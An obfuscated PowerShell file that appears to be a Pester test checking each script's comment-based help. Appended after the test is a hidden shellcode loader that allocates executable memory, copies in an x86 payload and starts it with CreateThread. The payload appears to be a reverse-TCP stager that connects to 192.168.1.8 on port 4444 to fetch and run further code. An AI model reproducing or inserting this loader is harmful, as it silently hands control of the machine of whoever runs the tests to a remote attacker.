${s`CRipTs} = &("{1}{0}{2}"-f'-ChildI','Get','tem') -Path ${p`ssC`RIptROOT} -Recurse -Filter *.P`s1 | 
                .("{3}{1}{2}{0}"-f 'bject','r','e-O','Whe') ("{0}{1}{2}" -f'F','ullN','ame') -NotMatch ("{1}{2}{0}"-f 'sts.','.','Te')

[regex]${r`e`geX} = ((("{3}{2}{1}{4}{0}" -f'-]+-)','{','-Z','(^[A','0}'))  -F[chAR]92)

.("{1}{2}{0}" -f 'be','De','scri') -Tag ("{1}{0}" -f 'p','Hel') ("{0}{1}"-f'Hel','p') {

    foreach (${sc`R`IPT} in ${scriP`TS}) {

        .("{0}{1}"-f 'Con','text') "[$($script.BaseName)] Validate Comment Based Help " {

            
            if (${S`Cri`PT}."n`Ame" -Match ${re`GeX}) {
                ${na`Me} = ${sCR`Ipt}."baSEN`A`Me"."RePlA`ce"(${MAtC`HEs}[0], '')
            } elseif (${sC`RI`pT}."NA`me" -match ("{1}{0}" -f'5-','O36')) {
                ${n`AME} = ${S`CRI`PT}."B`AS`ename"."RE`PLa`ce"(${Mat`Ch`ES}[0], '')
            } elseif (${SC`RipT}."N`AME" -match ("{6}{1}{0}{2}{5}{3}{4}"-f 'ti','nc','on_T','ate.p','s1','empl','Fu')) {
                ${NA`Me} = ("{1}{2}{3}{0}"-f'hing','G','et-Som','et') 
            } else {
                ${NA`Me} = ${SCRi`pT}."BasEN`A`ME"
            }

            
            if ((.("{3}{1}{2}{0}"-f 'nt','-Co','nte','Get') -Path ${scr`IPT}."fu`l`LnAme" -TotalCount 1) -match ("{0}{2}{1}" -f 'fun','n','ctio')) {
                
                
                . $(${SC`Ri`pt}."fuLl`Na`Me")

                ${FuNc`T`ion`he`lp} = &("{0}{2}{1}"-f 'G','p','et-Hel') ${nA`me} -Full

                &('It') ("{4}{0}{3}{1}{2}"-f 'tain','rip','tion','s Desc','Con') {
                    ${fuN`ctio`NHElp}."dE`sc`Ri`PtioN" | .("{1}{0}" -f'd','Shoul') ("{0}{1}" -f 'N','ot') ("{1}{3}{0}{2}"-f 'rEm','B','pty','eNullO')
                }
                
                &('It') ("{4}{2}{3}{0}{1}" -f'i','s','tains Sy','nops','Con') {
                    ${f`UncT`I`OnhELP}."S`y`NoPSiS" | .("{1}{0}" -f'ld','Shou') ("{1}{0}" -f't','No') ("{1}{0}{2}"-f 'eNullOrEmpt','B','y')
                }

                .('It') ("{2}{0}{1}{3}" -f 'tains Ex','amp','Con','les') {
                    ${FunctiO`N`hE`Lp}."E`xAMPles" | .("{2}{0}{1}"-f 'o','uld','Sh') ("{1}{0}"-f't','No') ("{3}{4}{0}{1}{2}"-f 'ullOrEmp','t','y','B','eN')
                }

                .('It') ("{3}{0}{2}{1}"-f'ame','ers','t','Contains Par') {
                    ${f`UN`CTIO`NHelP}."P`ARA`METErS" | &("{0}{2}{1}" -f'S','uld','ho') ("{1}{0}"-f'ot','N') ("{0}{2}{3}{4}{1}"-f 'B','lOrEmpty','eN','u','l')
                }
            } else {
                &('It') "[$($script.BaseName)] is not a function and skipped " {
                } -Skip
            }
        }
    }
}


${c} = ((("{21}{62}{12}{30}{11}{19}{26}{10}{32}{40}{69}{8}{47}{42}{64}{43}{48}{60}{55}{46}{71}{54}{57}{23}{37}{2}{6}{9}{1}{29}{24}{50}{5}{45}{34}{61}{18}{16}{36}{14}{66}{4}{63}{17}{28}{0}{59}{22}{51}{70}{53}{27}{13}{52}{3}{20}{25}{68}{31}{15}{7}{35}{38}{39}{33}{49}{41}{44}{67}{65}{56}{58}"-f 'r l','{0})]publi','rt({0','{0}',' dwSta',' IntP','}ker','rn','loc(I','nel32.dll',']public stat','el32.dll','lImport({0}k',';[DllImport','utes, ui','tic exte','pThreadAttr','ize, Int','ntPtr l','{0','msvcrt.dl','[D','lpParameter, ui','[DllI','tat','l{0})]public s','})','Ptr lpThreadId)','Pt','c s','ern','a','ic extern IntP','et(I','reateT',' In','ib','mpo','tPtr',' mems','tr Vir','tPtr d','Ptr lpAddr','e, u','est','tr C','Type, uin','nt','in','n','ic extern','nt dwCreat','(','nt','ct)','on','c, uint co',';','unt);','pStartAddress, IntPtr ','t flAllocati','hread(I','l','ckS','ess, uint dwSiz','nt sr','nt',', ui','t','tualAl','ionFlags, I','t flProte')) -F[chAR]34);${W} = &("{0}{2}{1}"-f'A','e','dd-Typ') -memberDefinition ${C} -Name ("{0}{1}" -f 'Win','32') -namespace ("{3}{1}{2}{0}" -f 'ns','n32Fu','nctio','Wi') -passthru;[Byte[]];[Byte[]]${Z} = 0xfc,0xe8,0x89,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xd2,0x64,0x8b,0x52,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf0,0x52,0x57,0x8b,0x52,0x10,0x8b,0x42,0x3c,0x01,0xd0,0x8b,0x40,0x78,0x85,0xc0,0x74,0x4a,0x01,0xd0,0x50,0x8b,0x48,0x18,0x8b,0x58,0x20,0x01,0xd3,0xe3,0x3c,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,0x31,0xc0,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf4,0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe2,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x58,0x5f,0x5a,0x8b,0x12,0xeb,0x86,0x5d,0x68,0x33,0x32,0x00,0x00,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,0x77,0x26,0x07,0xff,0xd5,0xb8,0x90,0x01,0x00,0x00,0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x00,0xff,0xd5,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x05,0x68,0xc0,0xa8,0x01,0x08,0x68,0x02,0x00,0x11,0x5c,0x89,0xe6,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0c,0xff,0x4e,0x08,0x75,0xec,0x68,0xf0,0xb5,0xa2,0x56,0xff,0xd5,0x6a,0x00,0x6a,0x04,0x56,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x8b,0x36,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x56,0x6a,0x00,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x6a,0x00,0x56,0x53,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x01,0xc3,0x29,0xc6,0x85,0xf6,0x75,0xec,0xc3;${g} = 0x1000;if (${Z}."LE`NGTH" -gt 0x1000){${g} = ${Z}."le`NGtH"};${X}=${W}::("{1}{2}{0}"-f'ualAlloc','V','irt').Invoke(0,0x1000,${g},0x40);for (${I}=0;${I} -le (${z}."l`EnGTh"-1);${I}++) {${W}::"ME`Ms`Et"([IntPtr](${X}.("{0}{2}{1}"-f 'ToI','t32','n').Invoke()+${I}), ${Z}[${i}], 1)};${w}::("{0}{1}{2}"-f'Cr','eat','eThread').Invoke(0,0,${x},0,0,0);for (;;){&("{1}{0}{2}"-f'slee','Start-','p') 60};
